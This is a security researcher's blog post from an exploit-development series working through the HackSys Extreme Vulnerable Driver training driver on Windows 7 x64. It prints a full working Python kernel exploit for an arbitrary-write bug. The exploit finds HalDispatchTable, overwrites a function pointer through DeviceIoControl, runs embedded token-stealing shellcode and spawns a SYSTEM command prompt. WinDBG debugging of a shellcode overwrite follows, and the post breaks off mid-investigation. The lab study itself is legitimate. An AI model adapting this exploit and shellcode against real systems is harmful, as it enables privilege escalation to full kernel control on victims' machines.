---
layout: single
title: HEVD Exploits -- Windows 7 x64 Arbitrary Write
date: 2020-02-01
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Exploit Dev
  - Drivers
  - Windows
  - x86
  - x86-64
  - Shellcoding
  - Kernel Exploitation
  - Write What Where
  - Arbitrary Overwrite
---

## Introduction
Continuing on with the Windows exploit journey, it's time to start exploiting kernel-mode drivers and learning about writing exploits for ring 0. As I did with my OSCE prep, I'm mainly blogging my progress as a way for me to reinforce concepts and keep meticulous notes I can reference later on. I can't tell you how many times I've used my own blog as a reference for something I learned 3 months ago and had totally forgotten. 

This series will be me attempting to run through every exploit on the [Hacksys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver). **I will be using HEVD 2.0**. I can't even begin to explain how amazing a training tool like this is for those of us just starting out. There are a ton of good blog posts out there walking through various HEVD exploits. I recommend you read them all! I referenced them heavily as I tried to complete these exploits. Almost nothing I do or say in this blog will be new or my own thoughts/ideas/techniques. There were instances where I diverged from any strategies I saw employed in the blogposts out of necessity or me trying to do my own thing to learn more.

**This series will be light on tangential information such as:**
+ how drivers work, the different types, communication between userland, the kernel, and drivers, etc
+ how to install HEVD,
+ how to set up a lab environment
+ shellcode analysis

The reason for this is simple, the other blog posts do a much better job detailing this information than I could ever hope to. It feels silly writing this blog series in the first place knowing that there are far superior posts out there; I will not make it even more silly by shoddily explaining these things at a high-level in poorer fashion than those aforementioned posts. Those authors have way more experience than I do and far superior knowledge, I will let them do the explaining. :)

This post/series will instead focus on my experience trying to craft the actual exploits. 

I used the following blogs as references:
+ All of the blog posts referenced in the [previous post](https://github.com/h0mbre/h0mbre.github.io/blob/master/_posts/2020-01-21-HEVD_Stackoverflow_64bit.md),
+ FuzzySecurity's [tutorial on this very exploit](https://www.fuzzysecurity.com/tutorials/expDev/15.html),
+ GradiusX [exploit code for a similar exploit](https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1607/HEVD_arbitraryoverwrite.py),
+ Abatchy's [post on the subject](https://www.abatchy.com/2018/01/kernel-exploitation-7),
+ jNizM [documentation for the SystemInformationModule returned structures](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f). 

Huge thanks to the blog authors, no way I could've finished these first two exploits without your help/wisdom. 

## Goal
For this post, I mostly relied on the GradiusX code mentioned above. They're doing a different technique in their code (hopefully we'll try it at some point) but the way they deal with the `SystemModuleInformation` struct in Python was very crucial to how I ended up doing it in this post. As you may remember from the x86 version of this post, the goal of this post was to create a much more organized exploit code that utilized classes instead of treating the aforementioned struct as a long string. We were succesful in that. The only thing that really bugged me about this exploit was there was behavior where during my exploit, the first two bytes of my shellcode buffer would be overwritten. Besides the BSODs, this was frustrating mostly because I never really root caused the issue. The issue may in fact lie in the way I decided to allocate my userland string buffers in Python, but time will tell. Ultimately, I was able to overcome the overwrites and develop a reliable exploit.

This exploit code will be very similar to the last post, so please read that one if you haven't. There's honestly not much difference. We'll only be talking about the differences and the shellcode overwrite issue and how I solved it. 

**You should be very familiar with our exploit approach from the previous post before continuing!!**

## Exploit Code Considerations for x64
In this section, I'll be detailing aspects of the exploit code that differ from its x86 counterpart. 

As you may recall from the first post, we need to get the kernel image name and base address so that we can use the address to calculate the location of the `HalDispatchTable` because we need to overwrite a function pointer there. A lot of this code will look the same, here is the entire function: 
```python
def base():
    
    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation")
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(
        0xb,
        sys_info,
        len(sys_info),
        addressof(sys_info_len)
    )

    sys_info = create_string_buffer(sys_info_len.value)

    result = ntdll.NtQuerySystemInformation(
        0xb,
        sys_info,
        len(sys_info),
        addressof(sys_info_len)
    )

    if result == 0x0:
        print("[*] Success, allocated {}-byte result buffer".format(str(len(sys_info))))

    else:
        print("[!] NtQuerySystemInformation failed with NTSTATUS: {}".format(hex(result)))

    class SYSTEM_MODULE_INFORMATION(Structure):
        _fields_ = [("Reserved", c_void_p * 2),
                    ("ImageBase", c_void_p),
                    ("ImageSize", c_long),
                    ("Flags", c_ulong),
                    ("LoadOrderIndex", c_ushort),
                    ("InitOrderIndex", c_ushort),
                    ("LoadCount", c_ushort),
                    ("ModuleNameOffset", c_ushort),
                    ("ImageName", c_char * 256)]

    # thanks GradiusX
    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
    
    sys_info = create_string_buffer(sys_info.raw[8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if "ntoskrnl" or "ntkrnl" in tmp.ImageName:
            img_name = tmp.ImageName.split("\\")[-1]
            print("[*] Kernel Type: {}".format(img_name))
            kernel_base = hex(tmp.ImageBase)[:-1]
            print("[*] Kernel Base: {}".format(kernel_base))
            return img_name, kernel_base
        counter += sizeof(tmp)
```

The primary difference here is going to be establishing a class for the `SYSTEM_MODULE_INFORMATION` structure. Its very similar to GradiusX's class in their exploit script; however, I changed the name of the last member so that it was more congruent with the FuzzySec's Powershell script. For more information about this struct, please see the [documenation I referenced throughout this bug class exploitation process](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f).

Let me break this down piece by piece. We declare a class that matches exactly with the aforementioned documentation that I referenced. We then create a `handle_num` variable of type `c_ulong()` which will be 8 bytes on x64 Windows. We create a string buffer and fill it with the first 8 bytes of our returned `sys_info` struct. We then move this buffer to the address of our `handle_num` variable which allows us to get the value in decimal of the number of `SystemModuleInformation` objects we returned with our `NtQuerySystemInformation` API call. You can see this here: 
```python
handle_num = c_ulong(0)
handle_num_str = create_string_buffer(sys_info.raw[:8])
memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
```

We then shorten the returned `sys_info` string by cutting off the first 8 bytes we just used and then interating through the string casting each `296` byte chunk as an instance of our class. You can see that we declare a `counter` variable which will increment each iteration by the size of our class (`296` bytes). The loop does the following:
+ While we haven't iterated through all of our returned modules (by getting the number of returned modules with `handle_num.value`),
+ create a temporary `SYSTEM_MODULE_INFORMATION` instance called `tmp`,
+ create a string buffer in a `0` to `296` byte chunk that contains one complete returned struct,
+ move that string buffer into our temporary `tmp` struct.
You can see all of this happening here: 
```python
counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if "ntoskrnl" or "ntkrnl" in tmp.ImageName:
            img_name = tmp.ImageName.split("\\")[-1]
            print("[*] Kernel Type: {}".format(img_name))
            kernel_base = hex(tmp.ImageBase)[:-1]
            print("[*] Kernel Base: {}".format(kernel_base))
            return img_name, kernel_base
        counter += sizeof(tmp)
```

We then check the `ImageName` member of the struct, and if it's a match for the kernel images we want to keep track of, we progress. We grab the name and the base address and return them. Function over, we just massively improved our code from the x86 version.

I'm not going to paste the entire function this time; however, in the next function we need to call both `LoadLibraryA` and `GetProcAddress` so that we can ultimately calculate the location of our target HDT function pointer. In order for those APIs to behave properly, we have to use the [`restype`](https://docs.python.org/3/library/ctypes.html) utility in `ctypes` for us to change the return type of a function. We do so accordingly to work with our 64-bit OS:
```python
kernel32.LoadLibraryA.restype = c_uint64
kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
kernel32.GetProcAddress.restype = c_uint64
```

Everything else works pretty much the same, except our `target_hal` variable on this one will be the `HalDispatchTable+0x8` since we're dealing with 8-byte pointers now (previously, it was `HalDispatchTable+0x4`). You would think now, all we do is just paste in the Token Stealing shellcode for x64 we already used in the stack overflow post and be on our merry way; however, that was not the case. As of right now, after inserting our shellcode from the last x64 exploit we performed, our code looks like this in all: 
```python
import ctypes, sys, struct
from ctypes import *
from ctypes.wintypes import *
from subprocess import *

kernel32 = windll.kernel32
ntdll = windll.ntdll

# HEVD!TriggerArbitraryOverwrite instructions: 
# mov     r11,qword ptr [rbx]
# mov     qword ptr [rdi],r11

def base():
    
    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation")
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(
        0xb,
        sys_info,
        len(sys_info),
        addressof(sys_info_len)
    )

    sys_info = create_string_buffer(sys_info_len.value)

    result = ntdll.NtQuerySystemInformation(
        0xb,
        sys_info,
        len(sys_info),
        addressof(sys_info_len)
    )

    if result == 0x0:
        print("[*] Success, allocated {}-byte result buffer".format(str(len(sys_info))))

    else:
        print("[!] NtQuerySystemInformation failed with NTSTATUS: {}".format(hex(result)))

    class SYSTEM_MODULE_INFORMATION(Structure):
        _fields_ = [("Reserved", c_void_p * 2),
                    ("ImageBase", c_void_p),
                    ("ImageSize", c_long),
                    ("Flags", c_ulong),
                    ("LoadOrderIndex", c_ushort),
                    ("InitOrderIndex", c_ushort),
                    ("LoadCount", c_ushort),
                    ("ModuleNameOffset", c_ushort),
                    ("ImageName", c_char * 256)]

    # thanks GradiusX
    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))

    sys_info = create_string_buffer(sys_info.raw[8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if "ntoskrnl" or "ntkrnl" in tmp.ImageName:
            img_name = tmp.ImageName.split("\\")[-1]
            print("[*] Kernel Type: {}".format(img_name))
            kernel_base = hex(tmp.ImageBase)[:-1]
            print("[*] Kernel Base: {}".format(kernel_base))
            return img_name, kernel_base
        counter += sizeof(tmp)

def hal_calc(img_name, kernel_base):

    
    kernel32.LoadLibraryA.restype = c_uint64
    kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
    kernel32.GetProcAddress.restype = c_uint64
    
    kern_handle = kernel32.LoadLibraryA(img_name)
    if not kern_handle:
        print("[!] LoadLibrary failed to retrieve handle to kernel with error: {}".format(str(GetLastError())))
        sys.exit(1)
    print("[*] Kernel Handle: {}".format(hex(kern_handle))[:-1])

    userland_hal = kernel32.GetProcAddress(kern_handle,"HalDispatchTable")
    if not userland_hal:
        print("[!] GetProcAddress failed with error {}".format(str(GetLastError())))
        sys.exit(1)
    print("[*] Userland HalDispatchTable Address: {}".format(hex(userland_hal))[:-1])

    kernel_hal = userland_hal - kern_handle + int(kernel_base,16)
    printable_hal = hex(kernel_hal)
    if printable_hal[-1] == "L":
        printable_hal = printable_hal[:-1]
    print("[*] Kernel HalDispatchTable Address: {}".format(printable_hal))

    target_hal = kernel_hal + 0x8    
    print("[*] Target HalDispatchTable Function Pointer at: {}".format(hex(target_hal)[:-1]))

    return target_hal    

def send_buf(target_hal):

    hevd = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", 
        0xC0000000, 
        0, 
        None, 
        0x3, 
        0, 
        None)
    
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))

    
    shellcode = bytearray(
        "\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00"
        "\x48\x8B\x40\x70\x48\x89\xC1\x49\x89\xCB\x49\x83\xE3\x07\xBA\x04"
        "\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00"
        "\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00"
        "\x48\x83\xE2\xF0\x4C\x09\xDA\x48\x89\x91\x08\x02\x00\x00\x5A\x41"
        "\x5B\x59\x58\xc3")

    print("[*] Allocating shellcode character array...")
    try:
        usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
        ptr = addressof(usermode_addr)
    except Exception as e:
        print("[!] Failed to allocate shellcode char array with error: " + str(e))
    print("[*] Allocated shellcode character array at: {}".format(hex(ptr)[:-1]))

    print("[*] Marking shellcode RWX...")
    result = kernel32.VirtualProtect(
        usermode_addr,
        c_int(len(shellcode)),
        c_int(0x40),
        byref(c_ulong())
    )

    if result == 0:
        print("[!] VirtualProtect failed with error code: {}".format(str(GetLastError())))

    print("[*] Allocating our What buffer...")
    try:
        new_buf_contents = bytearray(struct.pack("<Q", ptr))
        new_buf = (c_char * len(new_buf_contents)).from_buffer(new_buf_contents)
        new_buf_ptr = addressof(new_buf)
    except Exception as e:
        print("[!] Failed to allocate What buffer with error: " + str(e))
    print("[*] Allocated What buffer at: {}".format(hex(new_buf_ptr)[:-1]))

    print("[*] Marking What buffer RWX...")
    result = kernel32.VirtualProtect(
        new_buf,
        c_int(len(new_buf_contents)),
        c_int(0x40),
        byref(c_ulong())
    )

    if result == 0:
        print("[!] VirtualProtect failed with error code {}".format(str(GetLastError())))

    buf = struct.pack("<Q", new_buf_ptr)
    buf += struct.pack("<Q", target_hal)
    buf_length = len(buf)
    
    result = kernel32.DeviceIoControl(
        hevd,
        0x22200b,
        buf,
        buf_length,
        None,
        0,
        byref(c_ulong()),
        None
    )

    if result != 0:
        print("[*] Buffer sent to driver successfully.")
    else:
        print("[!] Payload failed. Last error: " + str(GetLastError()))

def exploit():
    
    print("[*] Triggering with NtQueryIntervalProfile...")
    ntdll.NtQueryIntervalProfile(0x2408, byref(c_ulong()))

    print("[*] Opening system shell...")
    Popen("start cmd", shell=True)


        
img_name, kernel_base = base()
target_hal = hal_calc(img_name, kernel_base)
send_buf(target_hal)
exploit()
```

## Roadblock
Possibly related to how I'm allocating buffers for my shellcode in Python, I ran into an issue where everything worked perfectly but somewhere between me allocating my shellcode buffer and then arriving at our `NtQueryIntervalProfile` API call (which triggers a call for the function pointer at `HalDispatchTable+0x8`), the first two bytes of my shellcode buffer are overwritten with `\x26\x00`. Let's take a look in WinDBG and see what we can see. 

Let's set a breakpoint on `HEVD!TriggerArbitraryOverwrite` to get the party started and then run our exploit. 
![](/assets/images/AWE/bp1.PNG)

We hit our breakpoint as planned, let's look at our debug messages in the console to get some more info. 
![](/assets/images/AWE/shellcode.PNG)

We can see that our shellcode array is located at `0x1df64a0`. Let's check out our memory view of that location in memory. 
![](/assets/images/AWE/shellcode.PNG)

Awesome, our shellcode looks exactly how we sent it. Let's now set a breakpoint on `NtQueryIntervalProfile` since that is our trigger and we'll know if everything is going to plan. (`bp !NtQueryIntervalProfile`)
![](/assets/images/AWE/ntquery.PNG)

Great, hit our breakpoint. Now let's check out our shellcode buffer so you can see the problem! Let's look at the exact same memory view again.
![](/assets/images/AWE/mem2.PNG)

Houston, we have a problem. Look at the first two bytes there, `\x26\x00` have overwritten the first two bytes of our shellcode buffer. If we disassemble this, we can see how this is now being interpreted. 
![](/assets/images/AWE/disasm.PNG)

Looking at the disassembly now, we see that the first 4 bytes of our overwritten shellcode, `26004153`, are being interpreted as `add byte ptr es:[rcx+53h],al`.

Let's grab some register values and see if we can figure out what this would do. 
```
rax 0
rcx 2408
```

So if we add `0` to a byte pointer at `0x2408`, we're probably looking at an access violation as that is probably not mapped memory. I'm going to manually change `\x26` to `\xc3` (the opcode for `RET`) so we can exit out of this shellcode safely and keep working with this session. To manually change the memory, in the Memory view, simply put your cursor infront of the 26 and type one letter/number at a time, be patient as this can take some time for WinDBG to register the change. One done, I'm going to go ahead and hit `g` in the console and let our script finish. 

## Finding the Culprit
Let's do all of this again, except this time, we'll put an "access" breakpoint on the memory address of our shellcode buffer and we'll catch whoever the hell is writing to it! Let's first run the script again with our `HEVD!TriggerArbitraryOverwrite` breakpoint so we can get the console output, find our shellcode buffer pointer, and then set a breakpoint on it. 
![](/assets/images/AWE/newConsole.PNG)

